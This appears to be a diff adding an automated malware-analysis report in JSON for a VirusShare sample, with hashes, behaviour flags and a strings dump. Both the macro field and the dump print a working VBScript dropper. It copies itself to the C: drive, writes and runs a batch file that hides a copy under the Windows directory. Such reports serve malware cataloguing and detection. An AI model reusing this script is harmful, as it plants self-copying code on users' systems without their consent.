@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "createobject": "May create an OLE object",
+            "createtextfile": "May create a text file",
+            "run": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "On Error Resume Next\ndim fso, wsh, dosfile\nset fso = createobject(\"scripting.filesystemobject\")\nset wsh = wscript.createobject (\"wscript.shell\")\nfso.CopyFile Wscript.ScriptFullName, \"C:\\viruz.vbs\", True \nset dosfile = fso.createtextfile (\"c:\\dosfile.bat\", true)\ndosfile.writeline (\"@echo off\")\ndosfile.writeline (\"cd %windir%\")\ndosfile.writeline (\"md \u0173\u0173\")\ndosfile.writeline (\"cd \u0173\u0173\")\ndosfile.writeline (\"copy C:\\viruz.vbs viruz.vbs\")\ndosfile.close\nwsh.run \"C:\\dosfile.bat\""
+    },
+    "filename": "VirusShare_8eecbf9c6c4e21eb1ef86079ffcefaf1",
+    "filesize": 490,
+    "filetype": "UTF-8 Unicode text, with CRLF line terminators",
+    "hashes": {
+        "md5": "8eecbf9c6c4e21eb1ef86079ffcefaf1",
+        "sha1": "352d7c69f76678333c26db6e59c5e5fae701e2f0",
+        "sha256": "6ba37c6b060ca9637db54bcf02cea31284f6e1bf5d455b727194a44393c1f579"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "dim fso, wsh, dosfile",
+            "set fso = createobject(\"scripting.filesystemobject\")",
+            "set wsh = wscript.createobject (\"wscript.shell\")",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\viruz.vbs\", True ",
+            "set dosfile = fso.createtextfile (\"c:\\dosfile.bat\", true)",
+            "dosfile.writeline (\"@echo off\")",
+            "dosfile.writeline (\"cd %windir%\")",
+            "dosfile.writeline (\"md \u0173\u0173\")",
+            "dosfile.writeline (\"cd \u0173\u0173\")",
+            "dosfile.writeline (\"copy C:\\viruz.vbs viruz.vbs\")",
+            "dosfile.close",
+            "wsh.run \"C:\\dosfile.bat\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.298918",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
